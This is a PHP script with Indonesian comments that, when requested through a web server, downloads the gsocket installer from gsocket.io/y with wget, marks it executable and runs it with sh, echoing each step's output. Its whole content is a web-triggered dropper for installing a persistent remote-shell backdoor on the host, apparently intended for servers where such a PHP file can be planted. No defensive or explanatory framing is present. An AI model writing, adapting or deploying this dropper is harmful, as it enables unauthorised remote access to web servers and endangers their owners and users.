<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Lokasi penyimpanan
$dst = __DIR__ . "/tmp/gsocket_y.sh";

// Download pakai wget via shell_exec (lebih pasti sukses)
$output = shell_exec("/bin/wget -O " . escapeshellarg($dst) . " https://gsocket.io/y 2>&1");
echo "<pre>WGET OUTPUT:\n$output</pre>";

// Cek apakah file tersimpan
if (!file_exists($dst)) {
    die("Gagal menyimpan file.\n");
}
chmod($dst, 0700);

// Tampilkan sebagian isi untuk dicek sebelum eksekusi
echo "<pre>PREVIEW SCRIPT:\n";
echo htmlspecialchars(implode("", array_slice(file($dst), 0, 40)));
echo "\n...</pre>";

// Eksekusi script
$execOut = shell_exec("sh " . escapeshellarg($dst) . " 2>&1");
echo "<pre>SCRIPT OUTPUT:\n$execOut</pre>";
